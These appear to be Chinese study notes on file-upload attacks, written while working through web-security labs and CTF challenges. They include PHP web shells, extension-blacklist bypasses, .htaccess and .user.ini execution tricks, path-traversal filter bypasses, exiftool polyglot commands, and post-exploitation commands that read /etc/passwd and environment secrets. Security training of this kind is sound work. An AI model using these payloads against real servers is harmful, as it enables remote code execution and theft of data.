    文件上传专题¶

    上传题的三个变量:路径、后缀、内容。 三个里任何一个没搞对,都表现为"上传成功但拿不到 shell"。

    一、先建立正确的心理模型¶

    你上传文件
    ↓
服务器做三件事(每件都可能被拦)
    ① 校验:后缀?Content-Type?文件内容?
    ② 保存:存到哪个目录?用什么名字?
    ③ 访问:通过哪个 URL 能拿到?
    ↓
你访问那个 URL
    ↓
能不能执行,取决于:那个目录有没有开 PHP 处理器

    绝大多数人卡在"③ 访问"这一步 —— 不知道文件在哪。

    二、上传后怎么找真实路径¶

    方法 1:上传响应里找¶

    响应可能是：

    The file avatars/aa.php has been uploaded.
<img src="/files/avatars/aa.php">
<a href="/uploads/aa.php">下载</a>

    如果只有第一种（"avatars/aa.php"），那是相对路径，前面还得补一段。

    方法 2:看"显示这个文件"的页面源码 ⭐ 最可靠¶

    浏览器打开 个人中心 / 资料页
→ Ctrl+U 查看源代码
→ Ctrl+F 搜 avatars / uploads / 你的文件名

    应用自己怎么引用，你就怎么访问。

    方法 4:按常见路径试¶

    /files/avatars/<名>
/uploads/<名>
/upload/<名>
/avatars/<名>
/images/<名>
/files/<名>
/static/uploads/<名>
/attachment/<名>

    响应码的含义：

    码 含义
    200 找到了
    404 这个路径没有
    403 路径对，但被禁止访问
    500 路径对，PHP 执行报错（说明能执行！）

    三、判断"PHP 到底执行了没"¶

    铁证 1:看响应体¶

    响应体内容 说明
    GIF89a + <?php echo ...; ?> 没执行（源码原样返回）
    GIF89a + 你要读的内容 执行了 ✅

    代码被"替换"成输出 = 执行；代码原样出现 = 没执行。

    铁证 2:看响应头 ⭐ 5 秒判断¶

    Last-Modified: Tue, 20 Oct 2026 08:05:12 GMT
Etag: "3f-65e411701a1d4"
Accept-Ranges: bytes

    这三个头 = Apache 在发静态文件。

    PHP 动态生成的内容不会带 Last-Modified 和 Accept-Ranges。

    铁证 3:看 Content-Length¶

    Content-Length: 63

    如果它正好等于你上传文件的字节数 → 原样吐出，没执行。

    执行过的话，长度会等于"输出结果"的长度。

    铁证 4:Content-Type¶

    头 说明
    Content-Type: image/jpeg 按图片分发（来自 multipart 里声明的类型）
    Content-Type: text/html 按 HTML 分发，可能执行了

    四、三个变量的绕过¶

    变量 1:后缀被拦¶

    黑名单绕过（按成功率排序）：

    手法 写法 前提
    大小写 shell.PHP、shell.PhP 黑名单区分大小写
    其他可执行后缀 shell.phtml、.php5、.php4、.pht、.phar Apache 配置了这些后缀
    双扩展名 shell.php.jpg 服务器按最后一个后缀判、但 Apache 按第一个执行
    末尾点/空格 shell.php.、shell.php Windows
    空字节截断 shell.php%00.jpg PHP < 5.3.4
    上传 .htaccess 内容 AddType application/x-httpd-php .jpg 允许上传 .htaccess
    分号 shell.php;.jpg 某些解析器

    判断黑名单还是白名单：

    传 .php   → 被拒  → 有校验
传 .phtml → 通过  → 黑名单(只封了 .php)
传 .phtml → 被拒  → 白名单(只允许图片后缀)

    黑名单绕过速查表（按「生效条件」排）¶

    手法 示例 生效条件 备注
    大小写 1.PhP 黑名单没做统一小写 最便宜的一招
    后加空格 / 点 1.php / 1.php. Windows 落盘时自动去掉 Linux 下无效
    ::$DATA 1.php::$DATA Windows + PHP（NTFS 备用数据流） 落盘后就是 1.php
    特殊后缀 .php5 .phtml .pht .phar Apache 配置把该后缀映射给 PHP 没映射就只能当静态文件
    .htaccess 内容 AddType application/x-httpd-php .jpg Apache 且放行上传 .htaccess 改规则，不改后缀
    .user.ini 内容 auto_prepend_file=shell.jpg FastCGI / PHP-FPM 见下一节
    双扩展名 1.php.jpg 校验看末尾、执行看开头（很少见） 白名单题里是死路
    空字节截断 1.php%00.jpg PHP < 5.3.4 现代环境基本失效
    分号 1.php;.jpg 某些 CGI 解析器 少见

    三个 Windows 专属的（Linux 上没用）：

    1.php␣     末尾空格,Windows 保存时自动去掉
1.php.     末尾点,同上
1.php::$DATA   NTFS 数据流,相当于 1.php

    一个 Apache 专属的（Nginx 上没用）：

    .htaccess

    一个 FastCGI 专属的（mod_php 上没用）：

    .user.ini

    关键认知：

    白名单题里 shell.php.jpg 是死路 —— 因为它让校验和执行「一致」了。

    你要的是「不一致」，不是「更长的名字」。

    变量 1 的终极解法：不改我的后缀，改服务器的规则¶

    黑名单管的是"哪些后缀不许传"；.htaccess 能改"哪些后缀算 PHP"。

    上传一个 .htaccess，内容：

    AddType application/x-httpd-php .lhm

    含义：告诉 Apache，.lhm 结尾的文件交给 PHP 处理器。

    然后传 shell.lhm（内容是 PHP 代码），访问 /files/avatars/shell.lhm → 执行。

    成立的两个前提：

    条件 说明
    黑名单没封 .htaccess 很多题只封 .php，.htaccess 是漏网之鱼
    AllowOverride 允许 Apache 默认 All，实验室通常开着

    同类思路（换服务器 / 换模块，本质一样）：

    文件 服务器 作用
    .htaccess Apache AddType / AddHandler 注册新后缀
    .user.ini PHP-FPM auto_prepend_file 自动包含你的文件
    web.config IIS handler 映射

    核心洞察：与其想办法骗过黑名单，不如直接改写服务器的判定规则。

    变量 1 的终极解法（二）：.user.ini¶

    .htaccess 管Apache，.user.ini 管PHP** —— 两个不同层面的配置。**

    维度 .htaccess .user.ini
    归属 Apache PHP
    读取者 Apache 进程 PHP-FPM / CGI
    能改什么 URL 重写、MIME、handler、访问控制 只有 PHP 的 ini 指令（auto_prepend_file 等）
    生效时机 立即 有缓存，默认 300 秒
    前提 AllowOverride 开着 user_ini.filename 非空（默认 .user.ini）

    服务器类型决定用哪个 ⭐¶

    环境 .htaccess .user.ini
    Apache + mod_php ✅ ❌ 不生效
    Apache + PHP-FPM ✅ ✅
    Nginx + PHP-FPM ❌ Nginx 不读它 ✅
    IIS + FastCGI ❌ ✅

    判断方法：看响应头。

    Server: Apache/2.4.41   → Apache
Server: nginx/1.18.0    → Nginx，只能用 .user.ini

    .user.ini 完整利用流程¶

    第 1 步：传一个"图片 + PHP"

    文件名:shell.jpg
内容:  <?php system($_GET['c']); ?>

    第 2 步：传 .user.ini

    auto_prepend_file=shell.jpg

    推荐写绝对路径（更稳）：

    auto_prepend_file=/var/www/html/upload/shell.jpg

    第 3 步：访问同目录下任意一个 .php 文件

    /upload/index.php?c=cat /flag

    执行顺序：

    ① 请求 /upload/index.php
② PHP 读到 .user.ini → auto_prepend_file=shell.jpg
③ 先 include shell.jpg
④ shell.jpg 里的 system($_GET['c']) 执行
⑤ 再执行 index.php 本身的代码

    五个坑¶

    坑 说明
    ① 300 秒缓存 user_ini.cache_ttl 默认 300 秒，传完立刻访问可能没反应
    ② 必须有 PHP 文件被访问 目录里没有 .php 被请求，.user.ini 永远不触发
    ③ 路径要写对 优先绝对路径，相对路径按 include_path 解析容易失败
    ④ 文件名可能被拉黑 有些题直接封 .user.ini 和 .htaccess
    ⑤ 语法是 php.ini 风格 key=value，不是 Apache 指令，等号两边别加空格

    为什么 .user.ini 更强¶

    它不需要"可执行的后缀" —— 你的 shell 可以叫 .jpg，照样被执行。

    .htaccess 的做法是"注册一个新后缀"，你仍然需要一个能被映射的后缀； .user.ini 绕过了这整个问题 —— 改成"执行前自动包含"，后缀无关。

    变量 2:Content-Type 被查¶

    改 multipart 里那一行：

    Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg        ← 声明成图片类型

    服务器只看这个头，不看内容 → 通过。

    变量 3:文件内容被查（图片头校验）¶

    如果服务器用 getimagesize() / exif_imagetype() 检查，就要伪装文件头：

    GIF89a
<?php echo file_get_contents('/home/carlos/secret'); ?>

    GIF89a 是 GIF 的魔数，getimagesize 只看开头几个字节就能通过。

    更高级的"图片马"：

    # 在真实图片后面追加 PHP 代码
copy real.gif /b + shell.php /a webshell.gif

    真实图片头 + 完整图片结构 + 尾部 PHP → 既能通过校验，又能被 Apache 当 PHP 执行（如果后缀绕过成功）。

    五、路径穿越：filename 里的 ../¶

    作用¶

    把文件从"禁止执行的上传目录"搬到"可执行的父目录"。

    move_uploaded_file($tmp, "avatars/" . $_FILES['avatar']['name']);

    传 ../shell.php：

    "avatars/" + "../shell.php"  =  "avatars/../shell.php"  =  "shell.php"
                                                              ↑
                                                        落到上一级

    判断有没有生效¶

    看上传响应里的路径：

    响应 结论
    The file **avatars/shell.php** has been uploaded ../ 被吃掉了（basename() 或 str_replace）
    The file **avatars/../shell.php** has been uploaded 穿越成功 ✅

    过滤与绕过¶

    过滤方式 绕过
    str_replace('../','',$name) ....// → 替换后变 ../
    只查字面量 ../ ..%2f（解码发生在检查之后）
    只拦 / ..%5c（Windows 反斜杠）
    basename() ❌ 绕不过，这条路彻底死

    %2f 为什么有效（经典原理）¶

    if (strpos($name, '../') === false) {   // ① 检查：看到的是 ..%2f，没有 ../
    move_uploaded_file($tmp, 'avatars/' . $name);  // ② 使用：此处解码 → ../
}

    检查用原始串，使用用解码串 —— 过滤发生在解码之前。

    这跟 SQL 注入里 %27 绕过单引号过滤是同一类漏洞。

    访问时千万不要带 ..¶

    ❌ /files/avatars/../shell.php   ← 浏览器/服务器会规范化，Apache 可能直接 400/404
✅ /files/shell.php              ← 直接写最终路径

    avatars/../shell.php 退一级就是 /files/shell.php。

    别把"上传时的相对路径"当成"访问时的 URL"。

    六、几个把人带偏的假象¶

    破法：Ctrl+F5，或 URL 加 ?t=123456。

    ② "图像无法正确显示"¶

    因为服务器返回 Content-Type: image/jpeg（来自你 multipart 里的声明）。

    浏览器就按图片渲染，内容却是 GIF89a + PHP 文本 → 渲染失败。

    这不代表 PHP 没执行 —— 就算执行了，返回的也是非图片内容，一样显示不出来。

    要看响应体，不要看浏览器渲染。可以直接看burpsuite里的response

    ③ 同名文件打架¶

    先传过 aa.jpg，再传 aa.php。

    如果 Apache 开了 MultiViews，访问 aa.php 可能被"内容协商"到 aa.jpg —— 你看到的其实是旧文件。

    破法：换一个全新的文件名。

    ④ 上传成功了，但文件被重命名¶

    有些程序存成随机名或 avatar.jpg：

    看响应、看页面源码里的 <img src>

    七、shell 代码本身的坑¶

    要用参数控制，就走 shell：

    <?=system($_GET['cmd']);?>          →  ?cmd=cat /home/carlos/secret

    ③ 最小验证顺序¶

    ① <?php echo 111; ?>                 → 返回 111 → 说明能执行
② <?php echo file_get_contents(...); ?> → 返回内容 → 说明路径对、权限够
③ <?=system($_GET['cmd']);?>         → 任意命令 → 完整 shell

    一次加一个变量，出问题时才知道是哪一步坏了。

    八、六个 lab 与五个实战记录¶

    8.1 六个 lab 对照表¶

    Lab 考点 关键动作 实战
    Remote code execution via web shell upload 直接传 .php 传完访问 /files/avatars/x.php ✅ 8.2
    Web shell upload via path traversal filename="../shell.php" 文件落到上级目录 ✅ 8.3
    Web shell upload via extension blacklist bypass .htaccess 改规则 AddType 注册新后缀 ✅ 8.4
    Web shell upload via obfuscated file extension %00 截断 shell.php%00.jpg ✅ 8.5

    Web shell upload via Content-Type restriction bypass 改 MIME multipart 里 Content-Type: image/jpeg ⬜ 待打

    六个 lab 正好对应六个变量：后缀、路径、黑名单、截断、内容、Content-Type。

    已经实战过 5 个，只剩 Content-Type 那一个 —— 它的套路和 8.6 几乎一样，只是多改一个请求头。

    两个知识点：

    ① 从响应字符串就能判断穿越成功没有：

    avatars/aa.php        → ../ 被过滤
avatars/../aa.php     → 穿越成功 ✅

    ② 访问时不要带 ..：

    URL 里的 .. 会被规范化，Apache 还可能直接拒绝含 .. 的请求。

    要写最终路径：avatars/../aa.php → /files/aa.php。

    ③ %2f 为什么能过：

    if (strpos($name, '../') === false) {          // 检查：看到 ..%2f，没匹配
    move_uploaded_file($tmp, 'avatars/' . $name);  // 使用：此处才解码成 ../
}

    检查用原始串，使用用解码串 —— 过滤在解码之前。

    8.4 实战 3：扩展名黑名单 + .htaccess¶

    过程：

    ① aa.php       → 页面提示"php 文件不允许上传"        （黑名单拦）
② aa.pHp5      → 上传成功，但访问只输出源码           （没有 .php5 的 handler）
③ ../aa.pHp5   → 报错
④ ..%2faa.php5 → 400 {"Invalid image file name"}     （撞上文件名字符校验）
⑤ 上传 .htaccess（AddType 把 .lhm 映射成 PHP）
⑥ 传 shell.lhm → 访问 → 执行成功 ✅

    每一步卡在不同层：

    尝试 卡在哪一层 报错形态
    aa.php ② 扩展名黑名单 正常页面 + 提示文字
    aa.pHp5 ③ 服务器 handler 200 + 源码（不报错）
    ..%2faa.php5 ① 文件名字符校验 400 + JSON

    结论：同一个 payload 在不同题上结果相反，因为防线不同。

    8.5 实战 4：混淆扩展名（白名单 + 截断）¶

    题目：只允许 jpg/png（白名单）

    ① shell.php          → 拒绝:"only jpg/png"
② shell.php.jpg      → 上传成功,但访问 200 + 源码 + Last-Modified → 静态
③ shell.php%00.jpg   → 上传成功,访问 → 执行 ✅
④ shell.php%20.jpg   → 也能执行(这个实现的偶然)

    为什么 ② 不行：两边都取最后一个后缀

    应用白名单:  取最后 .  → jpg → 放行
Apache:      取最后 .  → jpg → 当图片返回
                              ↑ 两边一致 → 静态

    为什么 ③ 行：NUL 是 C 语言的字符串终止符

    应用看到的:  shell.php\0.jpg     → 以 .jpg 结尾 → 放行
文件系统写入: shell.php           → 读到 \0 就停

    校验看的是"截断前"，存储用的是"截断后" —— 不一致，所以能跑。

    ④ 的 %20：

    这个实现里空格也被当成了截断点（可能文件名走了 shell，或某处按空白切分）。

    但它不是通用手法 —— 换个实现空格完全无效。

    手法 通用性
    %00 经典，老 PHP 必中（5.3.4 后修复）
    %20 偶然，依赖具体实现
    shell.php.jpg 白名单题死路；黑名单 + 特定 Apache 配置下有时有用

    你能用 %20 成功属于"歪打正着"，但暴露了一个有价值的思路：

    凡是"某个字符会让字符串提前结束"的地方，都可能制造"校验与使用不一致"。 \0、空格、换行、;、| —— 都值得试。

    8.6 实战 5：多语言文件（polyglot）¶

    题目：上传头像，但"只接受合法图片"

    过程：

    ① 试各种后缀:.php / .php5 / .phtml / .php.jpg / shell.php%00.jpg ...
   → 全部提示"不是合法的图片"
② 判断:它校验的不是后缀,是【文件内容】
   (magic bytes / getimagesize / exif_imagetype)
③ 换思路:造一个"内容真的是图片"的文件
   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
            photo.jpg -o shell.php
④ 上传 shell.php → 通过(内容是合法 JPEG)
⑤ 访问 /files/avatars/shell.php → 执行 → START xxx END

    为什么能过：同一个文件，两种合法身份

    对图片解析器:  合法 JPEG(有 SOI 头、APP 段、EOI 尾,能正常显示)
对 PHP 引擎:   合法 PHP(有 <?php ... ?> 代码段)

    这就是 "polyglot"（多语言文件）—— 一个文件同时满足两种格式。

    判断"查的是内容还是后缀"¶

    现象 结论
    换个后缀就被拒 查后缀（黑名单 / 白名单）
    换任何后缀都被拒 查内容
    换成真图片（哪怕内容是垃圾）就能过 查内容（只看文件头）

    口诀：

    改后缀有效   →  查后缀
改后缀无效   →  查内容

    一旦确认查内容，继续折腾后缀就是浪费时间 —— 要换"造文件"的思路。

    polyglot 的三种造法¶

    # ① exiftool 写进元数据(最常用,也最干净)
exiftool -Comment="<?php ... ?>" photo.jpg -o shell.php

# ② 直接在图片尾部追加 PHP(最简单粗暴)
copy /b photo.jpg + shell.php shell.jpg      # Windows
cat photo.jpg shell.php > shell.jpg          # Linux

# ③ 配合 .htaccess,让 .jpg 也执行(见 8.4)

    ① 的优点：图片元数据本来就是"允许有任意文本"的地方，不会破坏图片结构。

    为什么 PHP 代码里要加 START / END¶

    <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>

    因为 PHP 会把 <?php ?> 之外的内容原样输出。

    这个文件是一整张 JPEG，执行时响应体是：

    ÿØÿà JFIF ... 几万字节的图片二进制 ... START 秘密内容 END
                                        └────┬────┘
                                          好搜

    没有标记，秘密就混在二进制垃圾里，肉眼找不到。

    九、三道防线模型（最重要的一节）¶

    上传题永远是这三道门，任何一道没过，都表现为"上传成功但拿不到 shell"。

    ┌─────────────────────────────────────────────┐
│ ① 文件名格式校验                              │
│    正则:^[a-zA-Z0-9._-]+$                     │
│    拦:`/` `%2f` `..` `中文` `空格`            │
│    报错:400 + JSON                            │
├─────────────────────────────────────────────┤
│ ② 扩展名黑 / 白名单                           │
│    拦: .php .phtml .php3 ...                  │
│    报错:正常页面 + "不允许上传"                │
├─────────────────────────────────────────────┤
│ ③ Web 服务器有没有该后缀的 handler            │
│    没有 → 当静态文件返回                       │
│    报错:无（200 + 源码，最容易误判）           │
└─────────────────────────────────────────────┘

    9.1 四种报错形态 ↔ 四层问题¶

    你看到的 在哪一层 该动哪里
    400 + JSON 应用层格式校验 换文件名（去掉 / 等非法字符）
    正常页面 + "不允许" 应用层扩展名校验 换后缀 / .htaccess
    403 权限 / 目录禁止 换目录或换访问方式
    200 + 源码 服务器 handler 缺失 换一个真有 handler 的后缀
    200 + 代码输出 ✅ 成功 —

    这张表是排查上传题的入口 —— 先看报错形态，就知道卡在第几道门。

    9.2 三道门用的"同一招"¶

    "能上传"和"能执行"是两件事：

    过了 ① ② → 文件存下来了
过了 ③   → 文件才会被执行

    .php5 过了 ①②，死在 ③ —— 这就是"上传成功但只返回源码"的本质。

    所以看到"源码原样返回"时，不要再改后缀字母大小写了，要问：

    这个后缀,Apache 到底认不认?

    十、通用模型：解析器不一致¶

    十一、我踩的坑（实践版）¶

    坑 1：把"Invalid image file name"理解成"内容不是图片"¶

    报错里写的是 name，校验的是文件名字符串，不是文件内容。

    %2f 解码成 / → 不在字符白名单里 → 400。

    avatars/ 是服务端拼的目录前缀，不参与校验 —— 别以为它在被检查。

    坑 2：以为 .php5 上传成功就能执行¶

    能上传 ≠ 能执行。

    黑名单只管"不许传什么"，不管"传了能不能跑"。

    .php5 在很多 Apache 配置里根本没有 handler → 当静态文件返回。

    坑 6：把 304 当成错误¶

    304 = 缓存协商，响应体是空的，你看到的是旧缓存。

    破法：Ctrl+F5 或 URL 加 ?t=随机数。

    坑 7：把"图像无法显示"当成"没执行"¶

    服务器按 Content-Type: image/jpeg 返回，浏览器按图片渲染失败。

    就算 PHP 执行了，输出也不是合法图片，照样显示不出来。

    判断要看响应体，不看浏览器渲染。

    坑 8：不知道用响应头判断"执行了没"¶

    最可靠的三个信号：

    Last-Modified + Accept-Ranges: bytes  →  静态文件（没执行）
Content-Length = 你上传文件的字节数    →  原样吐出（没执行）
响应体里代码被替换成输出              →  执行了 ✅

    找路径的正确姿势：打开"显示这个文件的页面"，看 <img src>。

    坑 10：system() 里写 PHP 函数¶

    ❌ ?COMMAND=file_get_contents('/home/carlos/secret')
   → shell 找不到叫 file_get_contents 的程序

✅ ?COMMAND=cat /home/carlos/secret

    要执行 PHP 函数，得把函数名写进代码里，不是写进参数里。

    坑 11：以为 shell.php.jpg 能绕白名单¶

    白名单题里它是死路 —— 因为校验和执行都取最后一个后缀，两边一致。

    shell.php.jpg 只在黑名单题 + Apache 特定 AddHandler 配置下才可能执行。

    用之前先判断：这道题是黑名单还是白名单。

    坑 14：改后缀一直提示"不是合法图片"¶

    说明校验的是内容，不是后缀 —— 继续换后缀没有意义。

    判断口诀：

    改后缀有效   →  查后缀(换 .phtml / %00 / .htaccess)
改后缀无效   →  查内容(造 polyglot)

    很多人在这卡很久，因为"上传题 = 改后缀"是个刻板印象。

    上传题有三个变量：路径、后缀、内容。你已经把后缀那套试遍了，就该检查是不是卡在"内容"这一层。

    十二、工具：exiftool 速查¶

    12.1 它是什么¶

    读写图片/视频元数据的命令行工具。

    支持 EXIF、IPTC、XMP、文件内注释（Comment）等各种标签。

    上传题里的用途：把 PHP 代码写进一张真实图片的元数据里，造出 polyglot。

    ------exiftool--------------

    12.3 三个核心参数¶

    参数 作用 例子
    -标签=值 写入某个标签 -Comment="hello"
    -o 文件名 输出到新文件（不改原图） -o shell.php
    -all= 清空所有元数据 -all= -o clean.jpg

    不加 -o 时，exiftool 会原地修改文件，并生成一个 原文件名_original 备份。

    12.4 上传题最常用的四条命令¶

    # ① 把 PHP 写进 Comment,输出成 .php(polyglot 的核心命令)
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" photo.jpg -o shell.php

# ② 验证写进去了
exiftool shell.php | Select-String Comment

# ③ 看全部元数据
exiftool shell.php

# ④ 清空所有元数据
exiftool -all= -o clean.jpg photo.jpg

    12.5 常用的标签（JPEG）¶

    标签 说明
    -Comment 文件注释,最常用
    -ImageDescription 图片描述
    -Artist 作者
    -Copyright 版权
    -UserComment 用户注释(EXIF)

    写哪个标签不重要,关键是"代码能被写进文件字节里",而 PHP 执行时会忽略 <?php ?> 之外的一切。

    不是相对输入图片所在目录。

    ③ PowerShell 引号

    # 外层双引号,里面用单引号
exiftool -Comment="<?php echo 'START ' . file_get_contents('/x') . ' END'; ?>" a.jpg -o b.php

# 或者反过来
exiftool -Comment='<?php echo "START " . file_get_contents("/x") . " END"; ?>' a.jpg -o b.php

    别让内外层用同一种引号,会被吃掉。

    12.7 polyglot 自检两条¶

    ① 双击 shell.php → 能用图片查看器正常打开 → 说明仍是合法 JPEG(能过内容校验)
② exiftool shell.php | Select-String Comment → 能看到你的 PHP → 代码写进去了

    两条都过,就可以上传了。

    十三、拿到 shell 之后：常用命令速查¶

    上传成功只是拿到"执行入口",接下来要在这个入口里找 flag —— 用的就是 Linux 命令。

    你的 webshell 长这样：

    这里 是利用老版本php可以--替换掉 

    <script language='php'> system($_GET['id']); </script>

    访问 /upload/shell.phtml?id=命令 → 命令在目标服务器上执行。

    13.1 四步法（照着做就行）¶

    ① pwd / ls        我在哪?这里有什么?
② cat             读文件
③ find            找不到就全盘搜
④ id / uname      看环境(权限、系统版本)

    13.2 最常用的 10 条命令¶

    命令 作用 典型用法
    pwd 我在哪个目录 pwd
    ls 列目录 ls -la /var/www/html
    cat 看文件内容 cat /flag
    find 按名字找文件 find / -name "flag*" 2>/dev/null
    grep 在文件里搜内容 grep -r "flag" /var/www/html
    whoami 当前用户 whoami
    id 用户和组详情 id
    uname -a 系统内核版本 uname -a
    head / tail 看文件头/尾 head -20 /etc/passwd
    env 环境变量 env

    13.3 ls 详解¶

    ls = list,列出目录里有什么。

    命令 作用
    ls 列当前目录
    ls / 列根目录
    ls /home/carlos 列指定目录
    ls -l 详细列表（权限、大小、时间）
    ls -a 包括隐藏文件（. 开头的）
    ls -la 最常用（详细 + 隐藏）

    ls / 大概会看到：

    bin   boot  dev  etc  home  lib  media  mnt  opt
proc  root  run  sbin  srv  sys  tmp  usr  var

    这就是 Linux 的根目录结构。

    ls -l 的输出怎么读：

    drwxr-xr-x  2 root root 4096 Oct 20 12:00 upload
-rw-r--r--  1 root root   61 Oct 20 12:00 shell.phtml
└┬┘└──┬───┘
 │    └── 权限(读/写/执行 × 属主/属组/其他人)
 └── d = 目录,- = 普通文件

    看到 d 开头就是文件夹，可以继续 ls 进去。

    13.4 读文件：cat 家族¶

    命令 作用 场景
    cat /flag 全部输出 小文件
    head -20 文件 前 20 行 大文件先看头
    tail -20 文件 后 20 行 看日志尾部
    tac 文件 倒序输出 顺序不对时
    cat 文件1 文件2 连读多个 —

    ⚠️ cat 大文件会刷屏，先 head 或 wc -l 看看大小。

    13.5 搜索：找不到 flag 就用这个¶

    按文件名搜：

    find / -name "flag*" 2>/dev/null
    部分 含义
    find / 从根目录开始找
    -name "flag*" 名字以 flag 开头
    2>/dev/null 把"没权限"的报错丢掉（不然刷屏）

    按文件内容搜：

    grep -r "flag{" /var/www/html
grep -r "CTF" /home

    -r = 递归搜子目录。

    13.6 看环境：判断这台机器什么情况¶

    命令 输出什么 有什么用
    whoami www-data 当前权限（能读哪些文件）
    id uid=33(www-data) gid=33(www-data) 同上，更详细
    uname -a Linux xxx 5.4.0 ... 系统/内核版本（找提权漏洞用）
    cat /etc/passwd 用户列表 看有哪些用户
    env 环境变量 有时有数据库密码
    ps aux 进程列表 看跑了什么服务

    13.7 CTF 里 flag 常放的位置¶

    /flag
/flag.txt
/flag_is_here
/home/用户名/secret
/var/www/html/flag.php
/tmp/flag
/root/flag        ← 通常要 root 权限

    实战顺序：

    ls /                          # 根目录有没有 flag
cat /flag                     # 直接读
find / -name "flag*" 2>/dev/null   # 找不到就搜
    -------------------webshell里-------------

    ② 特殊字符要编码

    字符 编码 例子
    空格 %20 或 + ls%20/
    & %26 会被当参数分隔符
    \|（管道） %7C ls%7Cgrep flag
    > %3E 输出重定向
    ; %3B 多条命令

    ③ 管道要小心

    ?id=ls | grep flag        ← & 和 | 都可能出问题
?id=ls%7Cgrep%20flag      ← 编码后

    13.9 一句话总结¶

    拿到 shell 后先 pwd + ls,知道自己在哪、有什么。

    读文件用 cat,找不到就用 find / -name "flag*" 2>/dev/null。

    2>/dev/null 是必备的 —— 不然权限报错会淹没你的结果。

    所有命令跑在目标服务器上,不是你本机。

    十四、一句话总结¶

    上传题永远是三个问题: ① 存到哪了(路径) ② 存成什么(后缀) ③ 那个目录执行不执行 PHP

    找路径靠"显示文件的页面源码",不靠猜。 判断执行看响应头(有没有 Last-Modified/Accept-Ranges)和响应体(是源码还是输出)。 filename 里的 ../ 是搬运工,%2f 是它的绕过。

    题目长什么样¶

    只有一个上传表单（POST /，字段 file），Apache 2.4.54，文件存到 /uploads/，目录列表开着。

    防御模型（实测出来的）¶

    ① 内容里出现 <                → 拒绝（全量扫描）
② 内容里出现 php_value        → 拒绝（大小写都拦）
③ 内容里出现 auto_prepend_file → 拒绝（.user.ini 也拦）
④ 文件 > 约 900 字节           → 拒绝
⑤ 文件名里的 <                → 截断（a<b.txt 存成 a）

    已经拿到手的能力¶

    能力 证据
    传 .htaccess 且生效 AddType application/x-httpd-php .txt 后，.abc 也变 Content-Type: text/html
    AddHandler 同上
    RewriteEngine / RewriteRule RewriteRule ^rewrite_probe$ /uploads/a.txt [L] 生效
    同名覆盖 a.txt 内容从 hello 变 WORLD_V2
    php_flag 能传 php_flag display_errors on 未被拦
    Options +ExecCGI 能传 但 CGI 不执行（mod_cgi 大概没开）

    排除清单（每条都实测）¶

    手法 结果
    双写 <（<<??php） ❌ 是检测拒绝，不是删除
    代码放 200/400/500/600/800 偏移 ❌ 全量扫描
    前垫 3000 字节字段 ❌
    两个 file 字段（干净+恶意） ❌ WAF 和 PHP 读的是同一个 $_FILES['file']（都取最后一个）
    额外字段（file2/pad）+ 恶意在前 ❌
    Content-Type: image/gif + GIF89a 头 ❌
    0xFF / UTF-16 BOM / 空字节 / 非法 UTF-8 ❌
    无后缀 / .abc / .phtml / .php ❌ 一样拦
    php_value 放第 ⅔ 行、大小写变形 ❌
    php_admin_value、.user.ini ❌
    路径穿越（../、%2f、....//） ❌ basename 化
    ErrorDocument file:///etc/passwd ❌
    RewriteRule 越界到 /etc/passwd ❌
    被拒后文件残留 ❌ 404，没写盘
    TOCTOU 竞争（60 次上传 + 400 次 GET 并发） ❌ 没抢到
    第二入口（?file= 等 14 组参数） ❌ 响应完全一致
    常见文件/目录 fuzz（40 个） ❌ 除首页外无 200

    卡住的那句话¶

    我能决定「什么被当 PHP 执行」（.htaccess 可用），
但写不进「可执行的代码」（< 进不了文件、文件名、配置）。
而 PHP 的所有开标签都要 <。
